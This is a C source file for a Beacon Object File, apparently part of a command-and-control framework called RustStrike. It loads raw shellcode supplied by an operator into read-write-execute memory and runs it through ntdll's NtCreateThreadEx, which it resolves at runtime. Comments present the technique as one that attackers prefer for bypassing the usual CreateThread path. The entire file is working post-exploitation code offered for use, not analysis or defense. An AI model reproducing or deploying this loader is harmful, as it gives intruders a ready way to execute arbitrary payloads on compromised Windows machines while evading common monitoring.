/*
 * shellcode_exec_nt BOF for RustStrike — run raw shellcode via NtCreateThreadEx
 * (the "recommended" injection technique in ShellcodeExecutor.vue's dropdown).
 *
 *   args: [2-byte LITTLE-ENDIAN length][raw shellcode bytes]
 *         (same framing as shellcode_exec — ShellcodeExecutor.vue:143)
 *
 * Same VirtualAlloc+copy+wait flow as shellcode_exec, but spawns the thread
 * with the (semi-documented) ntdll!NtCreateThreadEx instead of kernel32!
 * CreateThread. This is the technique AdaptixC2/CS-style operators prefer
 * because it creates the thread without the kernel32 CreateThread thunk and
 * can target a remote process with an extended handle struct (here we keep it
 * in-process: no ATTRIBUTES, no CLIENT_ID — just enough to get a handle back).
 *
 * NtCreateThreadEx is exported by ntdll but has no import library header, so
 * we resolve it at runtime via GetModuleHandleA("ntdll")+GetProcAddress.
 *
 * Build (mingw):
 *   gcc -c examples/shellcode_exec_nt.c -o examples/shellcode_exec_nt.x64.o
 */
#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$GetExitCodeThread(HANDLE, LPDWORD);
DECLSPEC_IMPORT WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(VOID);
DECLSPEC_IMPORT int __cdecl MSVCRT$_snprintf(char *, size_t, const char *, ...);

/* NtCreateThreadEx signature (x64, __stdcall == fastcall on x64). The exact
 * prototype varies across Windows versions; the stable shape is:
 *   NTSTATUS NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
 *     POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle,
 *     LPTHREAD_START_ROUTINE StartAddress, LPVOID Argument,
 *     ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize,
 *     SIZE_T MaximumStackSize, PPS_ATTRIBUTE_LIST AttributeList);
 * We only need the first 6 + CreateFlags; the rest can be 0. */
typedef LONG (WINAPI *pNtCreateThreadEx)(PHANDLE, ULONG, PVOID, HANDLE,
    LPTHREAD_START_ROUTINE, LPVOID, ULONG, ULONG_PTR, SIZE_T, SIZE_T, PVOID);

#define WAIT_MS 30000

void go(char *args, int alen) {
    if (alen < 2) {
        BeaconPrintf(CALLBACK_ERROR, "shellcode_exec_nt: no shellcode (need >=2 byte len prefix)");
        return;
    }
    int len = (unsigned char)args[0] | ((unsigned char)args[1] << 8);
    if (len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "shellcode_exec_nt: zero-length shellcode");
        return;
    }
    if (len > alen - 2) len = alen - 2;
    unsigned char *sc = (unsigned char *)(args + 2);

    void *mem = KERNEL32$VirtualAlloc(NULL, (SIZE_T)len, 0x3000, 0x40 /*PAGE_EXECUTE_READWRITE*/);
    if (!mem) {
        BeaconPrintf(CALLBACK_ERROR, "shellcode_exec_nt: VirtualAlloc failed (%lu)",
                     KERNEL32$GetLastError());
        return;
    }
    unsigned char *dst = (unsigned char *)mem;
    for (int i = 0; i < len; i++) dst[i] = sc[i];

    /* Resolve NtCreateThreadEx from ntdll at runtime. */
    HMODULE ntdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        BeaconPrintf(CALLBACK_ERROR, "shellcode_exec_nt: ntdll not loaded (%lu)",
                     KERNEL32$GetLastError());
        KERNEL32$VirtualFree(mem, 0, 0x8000);
        return;
    }
    pNtCreateThreadEx NtCreateThreadEx =
        (pNtCreateThreadEx) KERNEL32$GetProcAddress(ntdll, "NtCreateThreadEx");
    if (!NtCreateThreadEx) {
        BeaconPrintf(CALLBACK_ERROR, "shellcode_exec_nt: NtCreateThreadEx not found (%lu)",
                     KERNEL32$GetLastError());
        KERNEL32$VirtualFree(mem, 0, 0x8000);
        return;
    }

    HANDLE th = NULL;
    /* 0x1FFFFF = THREAD_ALL_ACCESS; -1 = current process; CreateFlags 0. */
    LONG status = NtCreateThreadEx(&th, 0x1FFFFF, NULL, (HANDLE)(LONG_PTR)-1,
        (LPTHREAD_START_ROUTINE)mem, NULL, 0, 0, 0, 0, NULL);
    if (status < 0 || !th) {
        BeaconPrintf(CALLBACK_ERROR, "shellcode_exec_nt: NtCreateThreadEx failed (status=0x%lx)",
                     (unsigned long)status);
        KERNEL32$VirtualFree(mem, 0, 0x8000);
        return;
    }

    DWORD w = KERNEL32$WaitForSingleObject(th, WAIT_MS);
    DWORD exitCode = 0;
    KERNEL32$GetExitCodeThread(th, &exitCode);
    KERNEL32$CloseHandle(th);

    if (w == 0x00000000 /*WAIT_OBJECT_0*/) {
        BeaconPrintf(CALLBACK_OUTPUT, "shellcode_exec_nt: executed ok (%d bytes, thread exit %lu)",
                     len, exitCode);
    } else if (w == 0x00000102 /*WAIT_TIMEOUT*/) {
        BeaconPrintf(CALLBACK_OUTPUT, "shellcode_exec_nt: thread still running after %dms (%d bytes)",
                     WAIT_MS, len);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "shellcode_exec_nt: WaitForSingleObject=%lu (%lu)",
                     w, KERNEL32$GetLastError());
    }
}
